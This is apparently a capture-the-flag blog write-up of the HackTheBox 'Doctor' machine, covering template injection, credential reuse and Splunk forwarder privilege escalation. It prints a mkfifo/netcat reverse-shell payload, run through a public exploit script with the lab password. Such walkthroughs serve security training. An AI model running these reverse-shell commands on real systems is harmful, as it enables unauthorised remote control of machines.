<!DOCTYPE html><html lang="en-US" mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="day-prompt" content="days ago"><meta name="hour-prompt" content="hours ago"><meta name="minute-prompt" content="minutes ago"><meta name="justnow-prompt" content="just now"><meta name="generator" content="Jekyll v4.2.1" /><meta property="og:title" content="HackTheBox[DOCTOR]" /><meta name="author" content="Anurag M" /><meta property="og:locale" content="en_US" /><meta name="description" content="Cyber Security Blogs by Anurag M" /><meta property="og:description" content="Cyber Security Blogs by Anurag M" /><link rel="canonical" href="/posts/HackTheBox-DOCTOR/" /><meta property="og:url" content="/posts/HackTheBox-DOCTOR/" /><meta property="og:site_name" content="V1NC1D4" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2021-02-05T22:00:00+05:30" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="HackTheBox[DOCTOR]" /><meta name="twitter:site" content="@v1nc1d4" /><meta name="twitter:creator" content="@Anurag M" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"author":{"@type":"Person","name":"Anurag M"},"description":"Cyber Security Blogs by Anurag M","url":"/posts/HackTheBox-DOCTOR/","@type":"BlogPosting","headline":"HackTheBox[DOCTOR]","dateModified":"2021-11-20T14:06:14+05:30","datePublished":"2021-02-05T22:00:00+05:30","mainEntityOfPage":{"@type":"WebPage","@id":"/posts/HackTheBox-DOCTOR/"},"@context":"https://schema.org"}</script><title>HackTheBox[DOCTOR] | V1NC1D4</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="V1NC1D4"><meta name="application-name" content="V1NC1D4"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end" lang="en"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/assets/img/commons/avatar.jpg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">V1NC1D4</a></div><div class="site-subtitle font-italic">Artist | Designer</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center"> <a href="https://github.com/v1nc1d4" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/v1nc1d4" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['hello','vincida.me'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>HackTheBox[DOCTOR]</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>HackTheBox[DOCTOR]</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="semi-bold"> Anurag M </span> on <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Fri, Feb 5, 2021, 10:00 PM +0530" >Feb 5, 2021<i class="unloaded">2021-02-05T22:00:00+05:30</i> </span></div><div> <span> Updated <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Sat, Nov 20, 2021, 2:06 PM +0530" >Nov 20, 2021<i class="unloaded">2021-11-20T14:06:14+05:30</i> </span> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="923 words">5 min read</span></div></div><div class="post-content"><p><img data-proofer-ignore data-src="https://raw.githubusercontent.com/vincidadesigns/vincidadesigns.github.io/main/assets/img/posts/doctor/doctor.jpeg" alt="doctor" /></p><p>Doctor is an easy rated CTF style machine at <a href="https://hackthebox.eu">Hackthebox</a>, featuring Server Side Template Injection(SSTI) and privilege escalation by exploiting Splunk Universal Forwarder.</p><h2 id="about-the-machine">About The Machine</h2><div class="table-wrapper"><table><thead><tr><th>Name<th>OS<th>Difficulty<th>Creator<tbody><tr><td><a href="https://www.hackthebox.eu/home/machines/profile/278">Doctor</a><td>Linux<td>Easy<td><a href="https://www.hackthebox.eu/home/users/profile/94858">egotisticalSW</a></table></div><div class="table-wrapper"><table><thead><tr><th>Blood<th>User<tbody><tr><td>User<td><a href="https://www.hackthebox.eu/home/users/profile/77141">JKR</a><tr><td>Root<td><a href="https://www.hackthebox.eu/home/users/profile/13569">XCT</a></table></div><h2 id="reconnaissance">Reconnaissance</h2><h3 id="nmap">Nmap</h3><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-A</span> 10.10.10.209
</pre></table></code></div></div><p><img data-proofer-ignore data-src="https://raw.githubusercontent.com/vincidadesigns/vincidadesigns.github.io/main/assets/img/posts/doctor/nmap.png" alt="doctor" /></p><p>We can see that three ports are open on the machine. 22 , 80, which are standard SSH, HTTP, ports respectively. And port 8089 which is default port for splunkd web api.</p><p>Let’s take a look at the webpage.</p><p><img data-proofer-ignore data-src="https://raw.githubusercontent.com/vincidadesigns/vincidadesigns.github.io/main/assets/img/posts/doctor/1.png" alt="doctor" /></p><p>From the home page we can find a domain name <code class="language-plaintext highlighter-rouge">doctors.htb</code></p><p><img data-proofer-ignore data-src="https://raw.githubusercontent.com/vincidadesigns/vincidadesigns.github.io/main/assets/img/posts/doctor/2.png" alt="doctor" /></p><p>Add this domain to our <code class="language-plaintext highlighter-rouge">/etc/hosts</code> file pointing to <code class="language-plaintext highlighter-rouge">10.10.10.209</code></p><p><img data-proofer-ignore data-src="https://raw.githubusercontent.com/vincidadesigns/vincidadesigns.github.io/main/assets/img/posts/doctor/3.png" alt="doctor" /></p><h3 id="http">HTTP</h3><p>Let’s visit the webpage with the hostname.</p><p><img data-proofer-ignore data-src="https://raw.githubusercontent.com/vincidadesigns/vincidadesigns.github.io/main/assets/img/posts/doctor/4.png" alt="doctor" /></p><p>We can find login page, tried to login using sqli, but it did not work. So I decided to register to the website and login. After logging in we could not find anything interesting in the landing page, so let’s check the source code to find something interesting.</p><p><img data-proofer-ignore data-src="https://raw.githubusercontent.com/vincidadesigns/vincidadesigns.github.io/main/assets/img/posts/doctor/5.png" alt="doctor" /></p><p>Reviewing the source code we can find that there is a directory called archive which is still under beta testing. Let’s visit the page.</p><p><img data-proofer-ignore data-src="https://raw.githubusercontent.com/vincidadesigns/vincidadesigns.github.io/main/assets/img/posts/doctor/6.png" alt="doctor" /></p><p>We got nothing, the webpage seems to be blank, So let’s move back to the logged in dashboard. And try submitting a new message.</p><p>First let’s try a simple html H1 tag.</p><p><code class="language-plaintext highlighter-rouge">&lt;h1&gt;test&lt;/h1&gt;</code></p><p><img data-proofer-ignore data-src="https://raw.githubusercontent.com/vincidadesigns/vincidadesigns.github.io/main/assets/img/posts/doctor/7.png" alt="doctor" /></p><p>And we got the response that our message has been posted.</p><p><img data-proofer-ignore data-src="https://raw.githubusercontent.com/vincidadesigns/vincidadesigns.github.io/main/assets/img/posts/doctor/8.png" alt="doctor" /></p><p>Now let’s check the archive page to see any difference has occured.</p><p><img data-proofer-ignore data-src="https://raw.githubusercontent.com/vincidadesigns/vincidadesigns.github.io/main/assets/img/posts/doctor/9.png" alt="doctor" /></p><p>We got nothing in response in archive’s too. The page was blank again. Now let’s check the source of archive again.</p><p><img data-proofer-ignore data-src="https://raw.githubusercontent.com/vincidadesigns/vincidadesigns.github.io/main/assets/img/posts/doctor/10.png" alt="doctor" /></p><p>We can see that our message has been recorded, but did not execute.</p><p>After trying different ways, I found that we can record and execute our message using the following html tag.</p><p><code class="language-plaintext highlighter-rouge">&lt;/title&gt;&lt;/item&gt;&lt;h1&gt;test1&lt;/h1&gt;</code></p><p><img data-proofer-ignore data-src="https://raw.githubusercontent.com/vincidadesigns/vincidadesigns.github.io/main/assets/img/posts/doctor/11.png" alt="doctor" /></p><p>And the archive page displayed our message.</p><p><img data-proofer-ignore data-src="https://raw.githubusercontent.com/vincidadesigns/vincidadesigns.github.io/main/assets/img/posts/doctor/12.png" alt="doctor" /></p><p>Let’s check the source code again.</p><p><img data-proofer-ignore data-src="https://raw.githubusercontent.com/vincidadesigns/vincidadesigns.github.io/main/assets/img/posts/doctor/13.png" alt="doctor" /></p><p>Now we know that the webserver is vulnerable to Server Side Template Injection.</p><p>Searching the internet about the vulnerability, I came across some interesting articles ::</p><p><a href="https://portswigger.net/research/server-side-template-injection">Server-Side Template Injection</a></p><p><a href="https://medium.com/server-side-template-injection/server-side-template-injection-faf88d0c7f34">Server Side Template Injection</a></p><p>And a github repository containing basic injection payloads.</p><p><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection">PayloadsAllTheThings</a></p><p>First let’s try injecting basic payloads, so that we can be sure that, the webserver is vulnerable to attacks.</p><p>As most of the web servers use php, python, java as backened programming language let’s try jinja2 injection.</p><p>if the webserver is vulnerable this would result in 49.</p><p><img data-proofer-ignore data-src="https://raw.githubusercontent.com/vincidadesigns/vincidadesigns.github.io/main/assets/img/posts/doctor/14.png" alt="doctor" /></p><p>Let’s post it</p><p><img data-proofer-ignore data-src="https://raw.githubusercontent.com/vincidadesigns/vincidadesigns.github.io/main/assets/img/posts/doctor/15.png" alt="doctor" /></p><p>Now let’s check the archive page.</p><p><img data-proofer-ignore data-src="https://raw.githubusercontent.com/vincidadesigns/vincidadesigns.github.io/main/assets/img/posts/doctor/16.png" alt="doctor" /></p><p>We can confirm that the webserver is vulnerable. Now let’s exploit this vulnerability to gain shell on the remote machine.</p><h2 id="gaining-foothold">Gaining Foothold</h2><p>Let’s use the following payload found <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection">here</a></p><p><img data-proofer-ignore data-src="https://raw.githubusercontent.com/vincidadesigns/vincidadesigns.github.io/main/assets/img/posts/doctor/17.png" alt="doctor" /></p><p>Let’s modify the payload with our IP and PORT to gain reverse shell.</p><p><img data-proofer-ignore data-src="https://raw.githubusercontent.com/vincidadesigns/vincidadesigns.github.io/main/assets/img/posts/doctor/18.png" alt="doctor" /></p><p>Check whether the post has been posted.</p><p><img data-proofer-ignore data-src="https://raw.githubusercontent.com/vincidadesigns/vincidadesigns.github.io/main/assets/img/posts/doctor/19.png" alt="doctor" /></p><p>The post has been created, now let’s start our netcat listener on the specified port</p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nv">$ </span>nc <span class="nt">-nlvp</span> 4444
</pre></table></code></div></div><p><img data-proofer-ignore data-src="https://raw.githubusercontent.com/vincidadesigns/vincidadesigns.github.io/main/assets/img/posts/doctor/20.png" alt="doctor" /></p><p>Trigger the payload by visiting archive page.</p><p><img data-proofer-ignore data-src="https://raw.githubusercontent.com/vincidadesigns/vincidadesigns.github.io/main/assets/img/posts/doctor/21.png" alt="doctor" /></p><p>Let’s upgrade to a stable shell using following commands.</p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="nv">$ </span>python3 <span class="nt">-c</span> <span class="s1">'import pty;pty.spawn("/bin/bash")'</span>
<span class="nv">$ </span><span class="nb">export </span><span class="nv">TERM</span><span class="o">=</span>xterm
</pre></table></code></div></div><p><img data-proofer-ignore data-src="https://raw.githubusercontent.com/vincidadesigns/vincidadesigns.github.io/main/assets/img/posts/doctor/22.png" alt="doctor" /></p><p>Checking the username of current user using <code class="language-plaintext highlighter-rouge">whoami</code> command we find that we got shell as <code class="language-plaintext highlighter-rouge">web</code></p><p><img data-proofer-ignore data-src="https://raw.githubusercontent.com/vincidadesigns/vincidadesigns.github.io/main/assets/img/posts/doctor/23.png" alt="doctor" /></p><p>checking the <code class="language-plaintext highlighter-rouge">home</code> directory we find another user <code class="language-plaintext highlighter-rouge">shaun</code>, but we do not have access.</p><p><img data-proofer-ignore data-src="https://raw.githubusercontent.com/vincidadesigns/vincidadesigns.github.io/main/assets/img/posts/doctor/24.png" alt="doctor" /></p><h2 id="privilege-escalation">Privilege Escalation</h2><h3 id="shaun">shaun</h3><p>Manually enumerating the machine to find log files and backups files. In the <code class="language-plaintext highlighter-rouge">/var/log/apache2/doctors.htb</code> directory there is a file called <code class="language-plaintext highlighter-rouge">backup</code>.</p><p><img data-proofer-ignore data-src="https://raw.githubusercontent.com/vincidadesigns/vincidadesigns.github.io/main/assets/img/posts/doctor/25.png" alt="doctor" /></p><p>Let’s check this file to find password for user <code class="language-plaintext highlighter-rouge">shaun</code> using the following command.</p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">cat </span>backup | <span class="nb">grep </span>pass
</pre></table></code></div></div><p><img data-proofer-ignore data-src="https://raw.githubusercontent.com/vincidadesigns/vincidadesigns.github.io/main/assets/img/posts/doctor/26.png" alt="doctor" /></p><p>We can find a password <code class="language-plaintext highlighter-rouge">Guitar123</code> in the backup file. Now let’s login as user <code class="language-plaintext highlighter-rouge">shaun</code> using the password <code class="language-plaintext highlighter-rouge">Guitar123</code></p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nv">$ </span>su shaun
</pre></table></code></div></div><p><img data-proofer-ignore data-src="https://raw.githubusercontent.com/vincidadesigns/vincidadesigns.github.io/main/assets/img/posts/doctor/27.png" alt="doctor" /></p><p>We can find user flag under the directory <code class="language-plaintext highlighter-rouge">/home/shaun</code>.</p><p><img data-proofer-ignore data-src="https://raw.githubusercontent.com/vincidadesigns/vincidadesigns.github.io/main/assets/img/posts/doctor/28.png" alt="doctor" /></p><h3 id="root">root</h3><p>For escalating our privilege to root, let’s find interesting permissions, files, or processes running on the machine using <a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS">LinPEAS</a></p><p>LinPEAS is a script that search for possible paths to escalate privileges on Linux/UNIX* hosts.</p><p>For that let’s transfer the script to the remote machine. For that first start a webserver in our local machine using the following command.</p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nv">$ </span>python3 <span class="nt">-m</span> http.server 8000
</pre></table></code></div></div><p><img data-proofer-ignore data-src="https://raw.githubusercontent.com/vincidadesigns/vincidadesigns.github.io/main/assets/img/posts/doctor/29.png" alt="doctor" /></p><p>Download the privilege escalation script using <code class="language-plaintext highlighter-rouge">wget</code></p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nv">$ </span>wget http://YOUR-IP:8000/linpeas.sh
</pre></table></code></div></div><p><img data-proofer-ignore data-src="https://raw.githubusercontent.com/vincidadesigns/vincidadesigns.github.io/main/assets/img/posts/doctor/30.png" alt="doctor" /></p><p>After downloading the script in remote machine</p><p><img data-proofer-ignore data-src="https://raw.githubusercontent.com/vincidadesigns/vincidadesigns.github.io/main/assets/img/posts/doctor/31.png" alt="doctor" /></p><p>Provide required permission to run the script using <code class="language-plaintext highlighter-rouge">chmod</code></p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">chmod</span> +x linpeas.sh
</pre></table></code></div></div><p>Execute the script</p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nv">$ </span>./linpeas.sh
</pre></table></code></div></div><p>Executing linpeas, we find something interesting</p><p><img data-proofer-ignore data-src="https://raw.githubusercontent.com/vincidadesigns/vincidadesigns.github.io/main/assets/img/posts/doctor/32.png" alt="doctor" /></p><p>Splunk is a software platform to search, analyze and visualize the machine-generated data gathered from the websites, applications, sensors, devices etc. And splunkd is a system process that handles indexing, searching, forwarding.</p><p>Searching the internet we can find that we could escalate privilege using <a href="https://clement.notin.org/blog/2019/02/25/Splunk-Universal-Forwarder-Hijacking-2-SplunkWhisperer2/">Splunk Universal Forwarder Misconfiguration</a></p><p>Again researching more on the vulnerability I came across a github repository with an <a href="https://github.com/cnotin/SplunkWhisperer2">exploit</a></p><p>The repository contained information about the vulnerability and a python script to exploit the vulnerability.</p><p><a href="https://github.com/cnotin/SplunkWhisperer2/blob/master/PySplunkWhisperer2/PySplunkWhisperer2_remote.py">PySplunkWhisperer2_remote.py</a></p><p>Download the exploit.</p><p>Let’s start our netcat listener on desired port and execute the script using the following payload, The payload is modified referencing to the article given <a href="https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/">here</a></p><p>Payload</p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>python3 PySplunkWhisperer2_remote.py <span class="nt">--lhost</span> YOUR IP <span class="nt">--host</span> 10.10.10.209 <span class="nt">--username</span> shaun <span class="nt">--password</span> Guitar123 <span class="nt">--payload</span> <span class="s1">'/bin/bash -c "rm /tmp/vincida;mkfifo /tmp/vincida;cat /tmp/vincida|/bin/sh -i 2&gt;&amp;1|nc YOUR IP 1337&gt;/tmp/vincida"'</span>
</pre></table></code></div></div><p>Execute the <code class="language-plaintext highlighter-rouge">PySplunkWhisperer2_remote.py</code> with netcat listening on specified port.</p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nv">$ </span>nc <span class="nt">-nlvp</span> 1337
</pre></table></code></div></div><p><img data-proofer-ignore data-src="https://raw.githubusercontent.com/vincidadesigns/vincidadesigns.github.io/main/assets/img/posts/doctor/33.png" alt="doctor" /></p><p>And we are root now. Find the root flag in <code class="language-plaintext highlighter-rouge">/root</code> directory</p><p><img data-proofer-ignore data-src="https://raw.githubusercontent.com/vincidadesigns/vincidadesigns.github.io/main/assets/img/posts/doctor/34.png" alt="doctor" /></p><h2 id="resources">Resources</h2><div class="table-wrapper"><table><thead><tr><th>Topic<th>Url<tbody><tr><td>Server-Side Template Injection<td><a href="https://portswigger.net/research/server-side-template-injection">Click here</a><tr><td>Server Side Template Injection<td><a href="https://medium.com/server-side-template-injection/server-side-template-injection-faf88d0c7f34">Click here</a><tr><td>PayloadsAllTheThings<td><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection">Click here</a><tr><td>LinPEAS<td><a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS">Click here</a><tr><td>Splunk Universal Forwarder Misconfiguration<td><a href="https://clement.notin.org/blog/2019/02/25/Splunk-Universal-Forwarder-Hijacking-2-SplunkWhisperer2/">Click here</a><tr><td>SplunkWhisperer2<td><a href="https://github.com/cnotin/SplunkWhisperer2">Click here</a><tr><td>Exploit<td><a href="https://github.com/cnotin/SplunkWhisperer2/blob/master/PySplunkWhisperer2/PySplunkWhisperer2_remote.py">Click here</a><tr><td>Abusing Splunk Forwarders For Shells and Persistence<td><a href="https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/">Click here</a></table></div></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/hackthebox/'>HackTheBox</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/hackthebox/" class="post-tag no-text-decoration" >hackthebox</a> <a href="/tags/ssti/" class="post-tag no-text-decoration" >ssti</a> <a href="/tags/splunk/" class="post-tag no-text-decoration" >splunk</a> <a href="/tags/injection/" class="post-tag no-text-decoration" >injection</a> <a href="/tags/whisperer2/" class="post-tag no-text-decoration" >whisperer2</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=HackTheBox[DOCTOR] - V1NC1D4&url=/posts/HackTheBox-DOCTOR/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=HackTheBox[DOCTOR] - V1NC1D4&u=/posts/HackTheBox-DOCTOR/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=HackTheBox[DOCTOR] - V1NC1D4&url=/posts/HackTheBox-DOCTOR/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink('', 'Link copied successfully!')" data-toggle="tooltip" data-placement="top" title="Copy link"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/HackTheBox-BACKDOOR/">HackTheBox[BACKDOOR]</a><li><a href="/posts/HackTheBox-BOUNTYHUNTER/">HackTheBox[BOUNTYHUNTER]</a><li><a href="/posts/HackTheBox-DOCTOR/">HackTheBox[DOCTOR]</a><li><a href="/posts/HackTheBox-KNIFE/">HackTheBox[KNIFE]</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/hackthebox/">hackthebox</a> <a class="post-tag" href="/tags/suid/">SUID</a> <a class="post-tag" href="/tags/gobuster/">gobuster</a> <a class="post-tag" href="/tags/lfi/">lfi</a> <a class="post-tag" href="/tags/offsec-pg/">offsec-pg</a> <a class="post-tag" href="/tags/base32/">base32</a> <a class="post-tag" href="/tags/brute-force/">brute-force</a> <a class="post-tag" href="/tags/capabilities/">capabilities</a> <a class="post-tag" href="/tags/dd/">dd</a> <a class="post-tag" href="/tags/eval/">eval()</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/HackTheBox-KNIFE/"><div class="card-body"> <span class="timeago small" >Aug 28, 2021<i class="unloaded">2021-08-28T12:00:00+05:30</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HackTheBox[KNIFE]</h3><div class="text-muted small"><p> In this blog, we are going to discuss about pwning knife from hackthebox. About The Machine Name OS Difficulty Creator Knife Linux ...</p></div></div></a></div><div class="card"> <a href="/posts/HackTheBox-BOUNTYHUNTER/"><div class="card-body"> <span class="timeago small" >Nov 20, 2021<i class="unloaded">2021-11-20T07:00:00+05:30</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HackTheBox[BOUNTYHUNTER]</h3><div class="text-muted small"><p> BountyHunter is an easy rated CTF style machine at Hackthebox, the machine focuses on XXE (XML External Entity) injection to gain initial access to the machine and for escalating privilege to roo...</p></div></div></a></div><div class="card"> <a href="/posts/HackTheBox-BACKDOOR/"><div class="card-body"> <span class="timeago small" >Nov 22, 2021<i class="unloaded">2021-11-22T00:00:00+05:30</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HackTheBox[BACKDOOR]</h3><div class="text-muted small"><p> When a door closes, another opens…. At least for #hackers Backdoor #Easy #Linux Machine created by hkabubaker17 About The Machine Name OS Difficulty Creator ...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <span class="btn btn-outline-primary disabled" prompt="Older"><p>-</p></span> <a href="/posts/HackTheBox-KNIFE/" class="btn btn-outline-primary" prompt="Newer"><p>HackTheBox[KNIFE]</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2022 <a href="https://twitter.com/v1nc1d4">Anurag M</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/hackthebox/">hackthebox</a> <a class="post-tag" href="/tags/suid/">SUID</a> <a class="post-tag" href="/tags/gobuster/">gobuster</a> <a class="post-tag" href="/tags/lfi/">lfi</a> <a class="post-tag" href="/tags/offsec-pg/">offsec pg</a> <a class="post-tag" href="/tags/base32/">base32</a> <a class="post-tag" href="/tags/brute-force/">brute force</a> <a class="post-tag" href="/tags/capabilities/">capabilities</a> <a class="post-tag" href="/tags/dd/">dd</a> <a class="post-tag" href="/tags/eval/">eval()</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script 